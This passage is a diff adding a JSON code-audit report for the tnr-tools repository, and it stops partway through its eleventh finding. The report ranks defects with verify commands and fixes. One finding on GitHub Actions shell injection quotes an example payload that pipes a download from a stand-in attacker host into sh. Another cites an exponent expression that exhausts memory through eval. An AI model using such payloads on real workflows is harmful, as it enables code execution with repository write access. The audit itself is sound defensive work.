@@ -1,0 +1,729 @@
+{
+  "schema": "code-audit/v1",
+  "generated": "2026-09-03",
+  "target": {
+    "repo": "perseverance484/tnr-tools",
+    "head_sha": "6a1b3ca11168c49cd01aaf3aa023d4a2b6976e31",
+    "branch_scanned": "claude/repo-code-analysis-vktgej",
+    "surface": {
+      "javascript_lines": 885,
+      "python_lines": 11675,
+      "python_files": 62,
+      "workflows": 6
+    }
+  },
+
+  "consumer_notes": {
+    "purpose": "Ranked defect list for an agent to act on. Each finding is independently actionable unless 'depends_on' is non-empty.",
+    "line_numbers_valid_at": "6a1b3ca11168c49cd01aaf3aa023d4a2b6976e31",
+    "line_number_warning": "Anchors are byte-offset fragile. builder_bundle.js is written in a dense single-statement-per-line style, so a single line can be 4000+ characters and edits shift anchors immediately. Locate by the 'match' string, not the line number, and re-derive line numbers after any edit.",
+    "verification_contract": "Every finding with confidence='reproduced' carries a 'verify.command' that was actually executed against this SHA and produced 'verify.observed'. Re-run it before fixing and after fixing.",
+    "do_not_assume": "No fix in this document has been applied. The working tree at this SHA is unmodified.",
+    "severity_semantics": {
+      "high": "Producing wrong behavior now, or a security defect.",
+      "medium": "Correct at this SHA; breaks on a foreseeable and unremarkable input.",
+      "low": "No incorrect behavior; raises future cost or hides future defects."
+    },
+    "status_semantics": {
+      "live": "Symptom is present at this SHA, in the working tree or in committed artifacts.",
+      "latent": "Code path is wrong but the triggering condition has not occurred yet."
+    }
+  },
+
+  "findings": [
+    {
+      "id": "TNR-01",
+      "title": "Pool-code resolution and its guard are gated behind an unrelated flag",
+      "severity": "high",
+      "status": "live",
+      "confidence": "reproduced",
+      "subsystem": "builder_bundle.js",
+      "locations": [
+        { "file": "builder_bundle.js", "line": 721, "match": "if(dedupNames&&!sub){const creates=", "role": "gating condition" },
+        { "file": "builder_bundle.js", "line": 724, "match": "for(const r of rows)if(r.entity==='ai'||r.entity==='aiProfile')nres+=resolvePool(r.data)", "role": "the only resolvePool call site" },
+        { "file": "builder_bundle.js", "line": 250, "match": "const resolvePool=d=>", "role": "definition" }
+      ],
+      "problem": "resolvePool() has exactly one call site in the entire bundle, and that call site is nested inside the block opened by 'if(dedupNames&&!sub){' at line 721. The block also contains the guard that hard-blocks a manifest carrying an unresolved pool code. Consequence: a manifest that does not set \"dedupNames\": true never resolves pool codes to ids, AND never gets blocked for shipping them unresolved.",
+      "why_it_matters": "The guard's own inline comment states the failure mode: an unresolved pool code is pushed as a literal string, SILENTLY STRIPPED server-side under law 17, leaving the AI with no kit while the builder row reports green. Silent data loss with a false success signal.",
+      "evidence": [
+        {
+          "kind": "source_comment",
+          "file": "builder_bundle.js",
+          "text": "// a leftover pool code would be pushed as a literal string and SILENTLY STRIPPED\n// server-side (law 17), leaving the AI with no kit and a green row. Block instead."
+        },
+        {
+          "kind": "exposure",
+          "description": "Every AI-touching manifest in push/ omits the flag, so neither resolution nor the guard has ever run for them.",
+          "rows": [
+            { "manifest": "push/39_pale_fang_b10_swap.json", "dedupNames": null, "ai_entries": 1 },
+            { "manifest": "push/42_boss_self_target_fix.json", "dedupNames": null, "ai_entries": 3 },
+            { "manifest": "push/45_mission_ai_self_target_fix.json", "dedupNames": null, "ai_entries": 4 }
+          ]
+        },
+        {
+          "kind": "corroborating_history",
+          "commit": "57db2ad",
+          "message": "push 45: last four SELF-target mismatches; log dead kit slots",
+          "note": "'dead kit slots' is the predicted symptom of this defect."
+        },
+        {
+          "kind": "recurrence",
+          "note": "Same block, same bug class, second occurrence. Bundle header v4.22: 'capture.before was nested inside the if(dedupNames) block and never ran unless dedup was on; hoisted to build-body level.'"
+        }
+      ],
+      "verify": {
+        "command": "grep -n 'resolvePool' builder_bundle.js",
+        "observed": "Exactly two hits: line 250 (definition) and line 724 (sole call site, inside the dedupNames block).",
+        "supporting_command": "python3 -c \"import json,glob,os;\\n[print(os.path.basename(p), d.get('dedupNames'), len([i for i in (d.get('jutsu') or d.get('items') or []) if isinstance(i,dict) and i.get('entity') in ('ai','aiProfile')])) for p in sorted(glob.glob('push/*.json')) for d in [json.load(open(p,encoding='utf-8'))] if isinstance(d,dict)]\""
+      },
+      "fix": {
+        "summary": "Hoist pool resolution and the stuck-code guard out of the dedupNames block to build-body level.",
+        "steps": [
+          "Cut the block starting at line 723 ('{let nres=0;...') through the end of the stuck-code guard (the block ending '...$g.disabled=$r.disabled=0;return}}').",
+          "Re-insert it in build() after the img-upload phase and before the ordered push loop, at the same nesting level as the capture.before block, so it runs unconditionally.",
+          "Leave the dedupNames block containing only the live-name collision check, which is what that flag actually names.",
+          "Precedent to mirror exactly: the v4.22 hoist of capture.before."
+        ],
+        "acceptance": "grep shows the resolvePool loop is no longer inside any 'if(dedupNames' block. A manifest with an ai entry and no dedupNames key resolves pool codes; one with a deliberately bogus pool code is refused before any mutation.",
+        "effort": "small",
+        "risk": "low"
+      },
+      "depends_on": [],
+      "related": ["TNR-12"]
+    },
+
+    {
+      "id": "TNR-02",
+      "title": "Results bundles are stamped with a hardcoded stale builder version",
+      "severity": "high",
+      "status": "live",
+      "confidence": "reproduced",
+      "subsystem": "builder_bundle.js",
+      "locations": [
+        { "file": "builder_bundle.js", "line": 757, "match": "const bundle={builder:'v4.29',at:now()", "role": "the stale literal" },
+        { "file": "builder_bundle.js", "line": 449, "match": "const BVER='v4.31'", "role": "the correct value" }
+      ],
+      "problem": "The results-bundle writer hardcodes builder:'v4.29' while the running build is BVER='v4.31'. Every bundle written since v4.29 misattributes its own producer.",
+      "why_it_matters": "These bundles are the audit trail for pushes and the input to the answers pipeline (.github/scripts/build_answers.py). A provenance field that lies undercuts the read-back and postflight guarantees that v4.28 through v4.31 were built to provide.",
+      "evidence": [
+        {
+          "kind": "command_output",
+          "command": "for f in $(ls harvests/inbox/tnr_results_*.json | tail -3); do echo -n \"$f -> \"; python3 -c \"import json,sys;print(json.load(open(sys.argv[1]))['builder'])\" \"$f\"; done",
+          "output": "harvests/inbox/tnr_results_1788209137361.json -> v4.29\nharvests/inbox/tnr_results_1788235198666.json -> v4.29\nharvests/inbox/tnr_results_1788235395095.json -> v4.29"
+        }
+      ],
+      "verify": {
+        "command": "grep -n \"builder:'v4\" builder_bundle.js && grep -n \"const BVER=\" builder_bundle.js",
+        "observed": "Line 757 has builder:'v4.29'; line 449 has BVER='v4.31'."
+      },
+      "fix": {
+        "summary": "Replace the literal with the constant.",
+        "steps": ["In builder_bundle.js line 757, change builder:'v4.29' to builder:BVER."],
+        "acceptance": "grep -c \"builder:'v4\" builder_bundle.js returns 0. The next bundle written carries the running version.",
+        "effort": "trivial",
+        "risk": "none",
+        "note": "Does not retroactively correct the three committed bundles. Decide separately whether to annotate them; do not rewrite them silently, since they are evidence."
+      },
+      "depends_on": [],
+      "related": ["TNR-10"]
+    },
+
+    {
+      "id": "TNR-03",
+      "title": "selfcheck.py fails on the committed tree and is not wired into CI",
+      "severity": "high",
+      "status": "live",
+      "confidence": "reproduced",
+      "subsystem": "skills/building-tnr-content",
+      "locations": [
+        { "file": "skills/building-tnr-content/scripts/selfcheck.py", "role": "the gate that fails" },
+        { "file": ".github/workflows/skillpack.yml", "line": 30, "match": "- name: Doctrine layer coherent (ids + refs)", "role": "where the gate should be added" },
+        { "file": "skills/building-tnr-content/data/45c_DATA_constructors.json", "role": "drifted input, stamped 2026-08-30" },
+        { "file": "skills/building-tnr-content/data/45d_DATA_entity_schemas.json", "role": "drifted input, stamped 2026-08-26" },
+        { "file": "skills/building-tnr-content/data/45g_DATA_checks.json", "role": "drifted input, stamped 2026-08-26" }
+      ],
+      "problem": "The generated contract files come from two different upstream source drops. selfcheck.py detects this and exits 1. No workflow runs selfcheck.py, and no workflow runs 'validate.py --parity', so the condition persisted undetected.",
+      "why_it_matters": "45c defines the constructor unions the validator checks against; 45g is the shared check config that the browser preflight AND the container validator both read. Mismatched drops mean the two sides can disagree about what is legal, which is precisely the parity risk the file headers warn about.",
+      "evidence": [
+        {
+          "kind": "command_output",
+          "command": "cd skills/building-tnr-content/data && python3 ../scripts/selfcheck.py",
+          "output": "ERROR  generated files disagree on provenance: {'45c_DATA_constructors.json': '2026-08-30', '45d_DATA_entity_schemas.json': '2026-08-26', '45g_DATA_checks.json': '2026-08-26'}. Regenerate all of them from one source drop\nnote   29 bundled scripts parse\nnote   validate.py consumes all 16 declared 45g blocks\n\n1 errors",
+          "exit_code": 1
+        },
+        {
+          "kind": "contrast",
+          "note": "The three gates that ARE wired into skillpack.yml all pass clean: doctrinemap.py (exit 0), render_doctrine.py --check (exit 0), build_packs.py --check (exit 0)."
+        }
+      ],
+      "verify": {
+        "command": "cd skills/building-tnr-content/data && python3 ../scripts/selfcheck.py; echo \"exit $?\"",
+        "observed": "exit 1, provenance disagreement as above."
+      },
+      "fix": {
+        "summary": "Regenerate all three contract files from one upstream drop, then add the missing gates to skillpack.yml.",
+        "steps": [
+          "Regenerate 45c, 45d and 45e/45g from a single upstream SHA via schema_extract.py, following the docs/00_INDEX.md regen row. Do not hand-edit provenance stamps to agree.",
+          "Add to .github/workflows/skillpack.yml, before the zip step: a step running selfcheck.py from the data directory, and a step running validate.py --parity.",
+          "Note the cwd requirement: selfcheck.py resolves data files relative to the working directory and errors if run from repo root."
+        ],
+        "acceptance": "selfcheck.py exits 0 from the data directory. A deliberately mismatched provenance stamp fails the skillpack workflow.",
+        "effort": "medium",
+        "risk": "medium",
+        "risk_note": "Regeneration may surface real upstream contract drift. Adoption is manual by design through the schema_diff gate; do not auto-adopt."
+      },
+      "depends_on": [],
+      "related": ["TNR-09"]
+    },
+
+    {
+      "id": "TNR-04",
+      "title": "Harvest source selection orders by mtime, which is uniform under CI checkout",
+      "severity": "medium",
+      "status": "latent",
+      "confidence": "reproduced",
+      "subsystem": ".github/scripts",
+      "locations": [
+        { "file": ".github/scripts/build_answers.py", "line": 49, "match": "def newest(repo, frags):", "role": "function" },
+        { "file": ".github/scripts/build_answers.py", "line": 55, "match": "cands.append((rank, -os.path.getmtime(p), p)); break", "role": "the defective sort key" },
+        { "file": ".github/scripts/build_answers.py", "line": 56, "match": "return sorted(cands)[0][2] if cands else None", "role": "selection" }
+      ],
+      "problem": "The sort key is (fragment_rank, -mtime, path). Git stores no mtimes, so actions/checkout writes every file at checkout time. Within a fragment rank, ordering is decided by checkout write order, not harvest recency.",
+      "why_it_matters": "The module docstring promises 'Newest source per entity wins' and the INDEX.md it generates claims 'stamps are DERIVED from sources, so regeneration is idempotent'. Both become false as soon as any entity has two candidates, and the answers workflow auto-commits, so the repo would churn between sources.",
+      "evidence": [
+        {
+          "kind": "command_output",
+          "command": "ls -l --time-style=+%s harvests/*.json harvests/*/*.json | awk '{print $6}' | sort -u | wc -l",
+          "output": "1",
+          "interpretation": "All harvest files share one mtime, so the tiebreak carries no information."
+        },
+        {
+          "kind": "current_exposure",
+          "note": "Not yet triggered. Each entity resolves to exactly one candidate at this SHA.",
+          "rows": [
+            { "entity": "jutsu", "candidates": 1, "selected": "harvests/seed/40_INDEX_jutsu.json" },
+            { "entity": "item", "candidates": 1, "selected": "harvests/seed/41_INDEX_item.json" },
+            { "entity": "ai", "candidates": 1, "selected": "harvests/seed/42_INDEX_ai.json" },
+            { "entity": "asset", "candidates": 1, "selected": "harvests/seed/43_INDEX_asset.json" },
+            { "entity": "quest", "candidates": 1, "selected": "harvests/seed/47_INDEX_quest.json" }
+          ],
+          "trigger_condition": "A second file whose basename contains a fragment for the same entity, e.g. any new '*jutsu*.json' landing in harvests/."
+        }
+      ],
+      "verify": {
+        "command": "grep -n 'getmtime' .github/scripts/build_answers.py",
+        "observed": "Single hit at line 55."
+      },
+      "fix": {
+        "summary": "Order by a stamp the file actually carries rather than filesystem metadata.",
+        "steps": [
+          "Prefer the epoch already embedded in harvest filenames. bundle_epoch() at line 65 in the same module already parses 'tnr_results_(\\d+)'; generalize it.",
+          "For seed catalogs with no filename epoch, fall back to the in-file _freshness stamp that rows_from() already reads.",
+          "Last-resort fallback: git log -1 --format=%ct -- <path>, which is stable across checkouts.",
+          "Do not simply drop the tiebreak; make it deterministic, since the auto-commit makes nondeterminism visible as repo churn."
+        ],
+        "acceptance": "Running build_answers.py twice on a tree with two same-entity candidates selects the same source both times, and selects the one with the newer stamp.",
+        "effort": "small",
+        "risk": "low"
+      },
+      "depends_on": [],
+      "related": []
+    },
+
+    {
+      "id": "TNR-05",
+      "title": "Shell command injection via workflow_dispatch input in relay.yml",
+      "severity": "high",
+      "status": "latent",
+      "confidence": "static-analysis",
+      "subsystem": ".github/workflows",
+      "cwe": "CWE-78",
+      "locations": [
+        { "file": ".github/workflows/relay.yml", "line": 33, "match": "git fetch origin \"${{ github.event.inputs.branch }}\"", "role": "injection point 1" },
+        { "file": ".github/workflows/relay.yml", "line": 34, "match": "git merge --no-ff \"origin/${{ github.event.inputs.branch }}\"", "role": "injection point 2" },
+        { "file": ".github/workflows/relay.yml", "line": 35, "match": "-m \"relay: merge ${{ github.event.inputs.branch }} [auto]\"", "role": "injection point 3" },
+        { "file": ".github/workflows/relay.yml", "line": 36, "match": "git push origin main", "role": "implicit-ref defect" }
+      ],
+      "problem": "GitHub Actions expands ${{ }} into the shell script text before the shell parses it. Three separate interpolations of a user-supplied dispatch input sit inside double quotes in a run block, so an input containing a double quote escapes into command position. Example payload: main\"; curl attacker.example | sh; echo \"",
+      "why_it_matters": "The job holds contents:write. Exploitation requires repo write access to dispatch, which bounds severity, but the workflow's stated purpose is to move privileged main-writes OFF a long-lived PAT and onto the auto-expiring GITHUB_TOKEN. An injection here reintroduces the privilege it was built to contain.",
+      "secondary_defect": {
+        "description": "The job never runs 'git checkout main' before 'git push origin main'. actions/checkout checks out the ref the dispatch ran against, so the merge target is whichever branch the operator picked in the Run workflow dropdown. Non-fast-forward pushes fail rather than clobber, so this is a reliability defect rather than a data-loss one, but the target is implicit where it should be explicit.",
+        "severity": "low"
+      },
+      "evidence": [
+        {
+          "kind": "code",
+          "text": "run: |\n  git config user.name \"relay[bot]\"\n  git config user.email \"relay@users.noreply.github.com\"\n  git fetch origin \"${{ github.event.inputs.branch }}\"\n  git merge --no-ff \"origin/${{ github.event.inputs.branch }}\" \\\n    -m \"relay: merge ${{ github.event.inputs.branch }} [auto]\"\n  git push origin main"
+        }
+      ],
+      "verify": {
+        "command": "grep -n 'inputs.branch' .github/workflows/relay.yml",
+        "observed": "Three hits, lines 33, 34 and 35, all inside a run block."
+      },
+      "fix": {
+        "summary": "Bind the input to an environment variable so it stays data, and make the merge target explicit.",
+        "steps": [
+          "Add to the step: env:\\n  BRANCH: ${{ github.event.inputs.branch }}",
+          "Replace all three interpolations with \"$BRANCH\" / \"origin/$BRANCH\".",
+          "Add 'git checkout main' before the merge.",
+          "Optionally validate the input shape first, e.g. reject anything not matching ^[A-Za-z0-9._/-]+$."
+        ],
+        "acceptance": "No ${{ }} expression appears inside any run block in relay.yml. A dispatch input containing a double quote is treated as a branch name and fails cleanly at git fetch.",
+        "effort": "trivial",
+        "risk": "none",
+        "workflow_permission_note": "Writing to .github/workflows/ requires the Workflows permission. Per the repo's own ruling, the container PAT does not have it and must not be granted it. This edit is installed by hand through the web UI."
+      },
+      "depends_on": [],
+      "related": []
+    },
+
+    {
+      "id": "TNR-06",
+      "title": "The privacy scrub gate cannot see git history, binary files, or bot commits",
+      "severity": "medium",
+      "status": "latent",
+      "confidence": "static-analysis",
+      "subsystem": ".github/workflows",
+      "locations": [
+        { "file": ".github/workflows/scrub.yml", "line": 37, "match": "if grep -rIq --exclude-dir=.git -F -- \"$p\" .; then", "role": "the scan" },
+        { "file": ".github/workflows/scrub.yml", "line": 39, "match": "grep -rIl --exclude-dir=.git -F -- \"$p\" .", "role": "the report" }
+      ],
+      "problem": "Three structural blind spots in an otherwise correctly fail-closed gate.",
+      "gaps": [
+        {
+          "id": "history",
+          "severity": "medium",
+          "detail": "--exclude-dir=.git scans only the working tree at HEAD. A pattern committed and later removed passes every subsequent run while remaining in the pack and on the fork network. On a public repo, removal from HEAD is not remediation.",
+          "fix": "Add a separate scheduled job sweeping full history (git log -p, or gitleaks/trufflehog over the whole clone). Keep it separate from the per-push gate so it does not slow every push."
+        },
+        {
+          "id": "binaries",
+          "severity": "low",
+          "detail": "grep -I skips binary files by design. The 11 zips under dist/ and the packs under push/ are never scanned. Partially mitigated: dist/ zips are built from skills/, whose plaintext sources ARE scanned.",
+          "fix": "Unzip archives to a temp directory and grep the extracted tree, or drop dist/ from version control per TNR-08, which removes the exposure entirely."
+        },
+        {
+          "id": "bot_commits",
+          "severity": "low",
+          "detail": "Pushes authored with GITHUB_TOKEN do not trigger workflows. This is what makes answers and skillpack loop-safe, and it also means everything those four workflows commit is never scrubbed. Mitigated in practice because generated outputs derive from already-scanned inputs via substring-preserving transforms.",
+          "fix": "Run the scrub patterns against generated output inside the generating workflow, before its auto-commit step."
+        }
+      ],
+      "correct_as_designed": [
+        "Fail-closed on unset SCRUB_STRINGS is right, and the header comment correctly explains that the previous warn-and-pass behavior let 'no patterns configured' read as 'clean'.",
+        "The here-string loop does not run in a subshell, so hit=1 propagates correctly.",
+        "Error output names matching files but never echoes the pattern itself."
+      ],
+      "verify": {
+        "command": "grep -n 'grep -rI' .github/workflows/scrub.yml",
+        "observed": "Two hits at lines 37 and 39, both --exclude-dir=.git and both -I."
+      },
+      "fix": {
+        "summary": "Close each gap independently; see gaps[].fix. None requires changing the existing per-push gate logic.",
+        "effort": "medium",
+        "risk": "low",
+        "workflow_permission_note": "Same Workflows-permission constraint as TNR-05."
+      },
+      "depends_on": [],
+      "related": ["TNR-08"]
+    },
+
+    {
+      "id": "TNR-07",
+      "title": "eval() on upstream-derived arithmetic permits a denial of service in the nightly cron",
+      "severity": "medium",
+      "status": "latent",
+      "confidence": "static-analysis",
+      "subsystem": "skills/building-tnr-content",
+      "cwe": "CWE-95",
+      "locations": [
+        { "file": "skills/building-tnr-content/scripts/schema_extract.py", "line": 751, "match": "e[\"value\"] = eval(expr)  # numeric literals only", "role": "the eval" },
+        { "file": "skills/building-tnr-content/scripts/schema_extract.py", "line": 750, "match": "if re.match(r\"^[\\d\\s*/+\\-().]+$\", expr):", "role": "the guard" },
+        { "file": ".github/workflows/regen_schemas.yml", "line": 55, "match": "python3 \"$S/schema_extract.py\" /tmp/up --ctors", "role": "the untrusted-input path" }
+      ],
+      "problem": "The guard admits digits, whitespace, * / + - and parentheses. It correctly excludes all names and string literals, so this is NOT remote code execution. It does admit '**'. An upstream constant resolving to an expression such as 9**9**9**9 hangs or exhausts memory.",
+      "why_it_matters": "regen_schemas.yml runs daily on a cron and feeds schema_extract.py a freshly downloaded tarball of studie-tech/TheNinjaRPG, a third-party repository outside your control. The surrounding try/except catches exceptions but cannot interrupt a non-terminating computation.",
+      "explicitly_not_claimed": "This is not RCE. Without names or strings there is no attribute access and no callable reachable from the admitted grammar.",
+      "evidence": [
+        {
+          "kind": "code",
+          "text": "elif re.match(r\"^[\\w\\s*/+\\-().]+$\", r) and re.search(r\"[A-Z_]{2,}\", r):\n    expr = r\n    for ref in sorted(set(re.findall(r\"[A-Z][A-Z0-9_]+\", r)), key=len, reverse=True):\n        v = out.get(ref, {}).get(\"value\")\n        if isinstance(v, (int, float)):\n            expr = expr.replace(ref, str(v))\n    if re.match(r\"^[\\d\\s*/+\\-().]+$\", expr):\n        try:\n            e[\"value\"] = eval(expr)  # numeric literals only"
+        }
+      ],
+      "verify": {
+        "command": "grep -n 'eval(' skills/building-tnr-content/scripts/schema_extract.py",
+        "observed": "Single hit at line 751."
+      },
+      "fix": {
+        "summary": "Remove exponentiation from the admitted grammar, or replace eval with a bounded evaluator.",
+        "steps": [
+          "Minimal: reject '**' before evaluating, e.g. add 'and \"**\" not in expr' to the line 750 guard.",
+          "Preferred: replace eval with a small ast.parse walker permitting only Expression, BinOp over Add/Sub/Mult/Div, UnaryOp over UAdd/USub, Constant of int/float, and parenthesization. The admitted grammar is four operators wide, so the walker is roughly 20 lines.",
+          "Add a wall-clock or recursion bound around the extraction step in regen_schemas.yml as defense in depth."
+        ],
+        "acceptance": "schema_extract.py --constants on a fixture containing 'export const X = A ** B' with A and B numeric completes without evaluating it, and the extraction of all legitimate constants is unchanged against the current upstream.",
+        "effort": "small",
+        "risk": "low",
+        "regression_guard": "Diff the --constants output before and after against the same upstream SHA; it must be byte-identical apart from any '**' expression now left unresolved."
+      },
+      "depends_on": [],
+      "related": []
+    },
+
+    {
+      "id": "TNR-08",
+      "title": "Committed dist/ zips grow git history by 18 MB per skills push",
+      "severity": "high",
+      "status": "live",
+      "confidence": "reproduced",
+      "subsystem": "repo-structure",
+      "locations": [
+        { "file": ".github/workflows/skillpack.yml", "line": 41, "match": "(cd \"$d\" && zip -rq \"../../dist/${n}.zip\" .)", "role": "the packaging step" },
+        { "file": "dist/producing-tnr-art.zip", "role": "the 18.4 MB artifact" },
+        { "file": "skills/producing-tnr-art/data/rank_icons/", "role": "the bulk of the payload" },
+        { "file": "skills/producing-tnr-art/data/frames/raws/", "role": "the bulk of the payload" }
+      ],
+      "problem": "dist/producing-tnr-art.zip is 18.4 MB. Zips do not delta-compress, so every skills/** push stores a full new blob. History already holds four distinct copies after three skillpack runs. Roughly 43 percent of the 42.9 MB pack is revisions of this one file.",
+      "why_it_matters": "Unbounded monotonic growth on every skills push. Clone cost rises permanently and cannot be reduced without history rewriting, which gets more disruptive the longer it waits. An 18 MB skill zip is also unwieldy for the consumer the zip exists to serve.",
+      "root_cause": "The zip step archives the whole skill directory including art source inputs. Approximately 95 percent of the archive is *_raw.png files that a skill consumer does not need; they are inputs to the chroma keying pipeline, not outputs of it.",
+      "evidence": [
+        {
+          "kind": "command_output",
+          "command": "git count-objects -vH | grep size-pack",
+          "output": "size-pack: 42.86 MiB"
+        },
+        {
+          "kind": "command_output",
+          "command": "git rev-list --objects --all | git cat-file --batch-check='%(objecttype) %(objectname) %(objectsize) %(rest)' | awk '$1==\"blob\"{print $3, $4}' | sort -rn | head -4",
+          "output": "18.4MB dist/producing-tnr-art.zip\n18.4MB dist/producing-tnr-art.zip\n18.4MB dist/producing-tnr-art.zip\n18.4MB dist/producing-tnr-art.zip",
+          "interpretation": "Four distinct blobs at the same path."
+        },
+        {
+          "kind": "zip_composition",
+          "command": "python3 -c \"import zipfile; z=zipfile.ZipFile('dist/producing-tnr-art.zip'); [print(f'{x.file_size/1048576:7.2f}MB  {x.filename}') for x in sorted(z.infolist(),key=lambda x:-x.file_size)[:8]]\"",
+          "total_members": 39,
+          "largest": [
+            { "mb": 2.71, "member": "data/rank_icons/icon_rank_A_raw.png" },
+            { "mb": 2.62, "member": "data/rank_icons/icon_rank_D_raw.png" },
+            { "mb": 2.59, "member": "data/rank_icons/icon_rank_B_raw.png" },
+            { "mb": 2.27, "member": "data/rank_icons/icon_rank_C_raw.png" },
+            { "mb": 1.50, "member": "data/frames/raws/icon_plate_lacquer_A3_raw.png" },
+            { "mb": 1.47, "member": "data/frames/raws/icon_plate_lacquer_B_raw.png" },
+            { "mb": 1.25, "member": "data/frames/raws/icon_plate_lacquer_C_raw.png" },
+            { "mb": 0.48, "member": "data/rank_icons/icon_rank_A.png" }
+          ]
+        }
+      ],
+      "verify": {
+        "command": "git log --oneline --all --grep='skillpack: rebuild' | wc -l",
+        "observed": "3 auto-commits, corresponding to 4 blobs including the initial add."
+      },
+      "fix": {
+        "summary": "Stop the growth first, then decide about existing history separately.",
+        "steps": [
+          "STOP THE BLEEDING (do this first, independently): add exclusions to the zip step, e.g. zip -rq ... . -x '*_raw.png' -x 'data/frames/raws/*'. Expected result: archive drops from 18.4 MB to roughly 2 MB.",
+          "STRUCTURAL (preferred): publish skill zips as GitHub Release assets and remove dist/ from version control. Release assets are not stored in the pack.",
+          "HISTORY (optional, disruptive, requires explicit owner decision): the four existing blobs remain until history is rewritten with git filter-repo. Do not do this without the owner's explicit instruction; it invalidates every existing clone and all published commit SHAs, including the jsDelivr pins that release_pin.yml has already written into the loader."
+        ],
+        "acceptance": "A fresh skillpack run produces dist/producing-tnr-art.zip under 3 MB, and the zip still contains every file the producing-tnr-art skill actually loads at runtime.",
+        "effort": "small for step 1, medium for step 2, large for step 3",
+        "risk": "medium",
+        "risk_note": "Before excluding, confirm no script under skills/producing-tnr-art/scripts/ reads a *_raw.png at runtime. Grep for '_raw' across that skill's scripts and SKILL.md first.",
+        "workflow_permission_note": "Step 1 edits .github/workflows/skillpack.yml; same Workflows-permission constraint as TNR-05."
+      },
+      "depends_on": [],
+      "related": ["TNR-06"]
+    },
+
+    {
+      "id": "TNR-09",
+      "title": "Pillow is an undeclared hard dependency and the art toolchain has no CI coverage",
+      "severity": "medium",
+      "status": "live",
+      "confidence": "reproduced",
+      "subsystem": "repo-structure",
+      "locations": [
+        { "file": "skills/producing-tnr-art/scripts/chroma.py", "role": "imports PIL" },
+        { "file": "skills/producing-tnr-art/scripts/artpreflight.py", "role": "imports PIL" },
+        { "file": "skills/producing-tnr-art/scripts/artpreflight_selftest.py", "line": 19, "role": "imports PIL, fails on clean checkout" },
+        { "file": "skills/building-tnr-content/scripts/mkflow.py", "role": "imports PIL" },
+        { "file": "skills/building-tnr-content/scripts/mkcard.py", "role": "imports PIL" }
+      ],
+      "problem": "No requirements.txt, pyproject.toml, setup.py or Pipfile exists anywhere in the repo. Pillow is the only third-party dependency and is imported by five scripts across both skills. No workflow installs it and no workflow runs the art selftest.",
+      "why_it_matters": "The art half of the toolchain has zero CI coverage, so this breakage is invisible. A fresh environment cannot run those scripts without out-of-band knowledge.",
+      "evidence": [
+        {
+          "kind": "command_output",
+          "command": "python3 skills/producing-tnr-art/scripts/artpreflight_selftest.py",
+          "output": "Traceback (most recent call last):\n  File \"skills/producing-tnr-art/scripts/artpreflight_selftest.py\", line 19, in <module>\n    from PIL import Image, ImageDraw\nModuleNotFoundError: No module named 'PIL'",
+          "exit_code": 1
+        },
+        {
+          "kind": "command_output",
+          "command": "ls requirements*.txt pyproject.toml setup.py Pipfile",
+          "output": "No such file or directory (all four)"
+        },
+        {
+          "kind": "dependency_survey",
+          "command": "grep -rhoE '^\\s*(from|import) [a-zA-Z_][a-zA-Z0-9_]*' --include=*.py skills .github push | awk '{print $2}' | sort -u",
+          "third_party": ["PIL"],
+          "note": "Everything else is stdlib or a local sibling module."
+        }
+      ],
+      "verify": {
+        "command": "grep -rln 'from PIL\\|import PIL' --include=*.py .",
+        "observed": "Five files, as listed in locations."
+      },
+      "fix": {
+        "summary": "Declare the dependency and give the art skill a CI gate.",
+        "steps": [
+          "Add requirements.txt at repo root pinning Pillow to a specific version.",
+          "Add 'pip install -r requirements.txt' to skillpack.yml after the setup-python step.",
+          "Add a step running artpreflight_selftest.py so the art skill is gated like the content skill.",
+          "Consider also running rawqc.py --selftest and shotlist.py --selftest, which appear to be stdlib-only and therefore already runnable."
+        ],
+        "acceptance": "artpreflight_selftest.py exits 0 in CI, and a deliberately broken art script fails the skillpack workflow.",
+        "effort": "small",
+        "risk": "low",
+        "workflow_permission_note": "Same Workflows-permission constraint as TNR-05."
+      },
+      "depends_on": [],
+      "related": ["TNR-03"]
+    },
+
+    {
+      "id": "TNR-10",
+      "title": "Version string is duplicated three ways and the HEAD self-check regex expires at v5.0",
+      "severity": "medium",
+      "status": "latent",
+      "confidence": "static-analysis",
+      "subsystem": "builder_bundle.js",
+      "locations": [
+        { "file": "builder_bundle.js", "line": 449, "match": "const BVER='v4.31'", "role": "copy 1, the source of truth" },
+        { "file": "builder_bundle.js", "line": 1, "match": "// TNR content builder bundle v4.31", "role": "copy 2, header comment" },
+        { "file": "builder_loader_user.js", "line": 4, "match": "// @version      4.31", "role": "copy 3, userscript metadata" },
+        { "file": "builder_bundle.js", "line": 453, "match": "const m=head.match(/v4\\.\\d+/)", "role": "the expiring regex" }
+      ],
+      "problem": "Two defects in one area. First, the running version is hand-maintained in three places; TNR-02 is what a fourth drifting copy already cost. Second, headCheck parses the repo's served version with /v4\\.\\d+/, which stops matching at v5.0.",
+      "why_it_matters": "The regex fails open by design: on no match, headCheck returns silently and appends no warning. So on the day the bundle ships as v5.0, the staleness detection that the entire v4.28 work order exists to provide disappears with no error and no signal that it is gone. Failing open is correct for fetch errors and wrong for a parse that can never succeed again.",
+      "evidence": [
+        {
+          "kind": "code",
+          "text": "const head=atob(String(j.content).replace(/\\s/g,'').slice(0,400));\nconst m=head.match(/v4\\.\\d+/);\nif(m&&m[0]!==BVER){const t=q('.k-ti');if(t)t.textContent+=' \\u26a0HEAD '+m[0]}"
+        }
+      ],
+      "verify": {
+        "command": "grep -n \"BVER\\|v4\\\\\\\\.\" builder_bundle.js | head",
+        "observed": "BVER defined at 449, regex at 453, used in title render at 787 and 789."
+      },
+      "fix": {
+        "summary": "Widen the regex and derive the duplicate copies mechanically.",
+        "steps": [
+          "Change /v4\\.\\d+/ to /v\\d+\\.\\d+/ at line 453.",
+          "Consider warning when the regex fails to match at all, rather than returning silently, so a future parse failure is visible.",
+          "Derive the loader @version and the bundle header comment from BVER in release_pin.yml, which already rewrites builder_loader_user.js on every bundle push and is therefore the natural place to do it."
+        ],
+        "acceptance": "A bundle whose header reads v5.0 is correctly compared against BVER. grep finds exactly one hand-maintained version literal in the repo.",
+        "effort": "small",
+        "risk": "low"
+      },
+      "depends_on": [],
+      "related": ["TNR-02"]
+    },
+
+    {
+      "id": "TNR-11",
+      "title": "Twelve duplicate blobs across four path pairs, three of them ungated",
+      "severity": "low",
+      "status": "live",
+      "confidence": "reproduced",
+      "subsystem": "repo-structure",
+      "groups": [
+        {
+          "id": "machine-synced",
+          "verdict": "correct, no action",
+          "paths": [
+            ["45c_DATA_constructors.json", "skills/building-tnr-content/data/45c_DATA_constructors.json"],
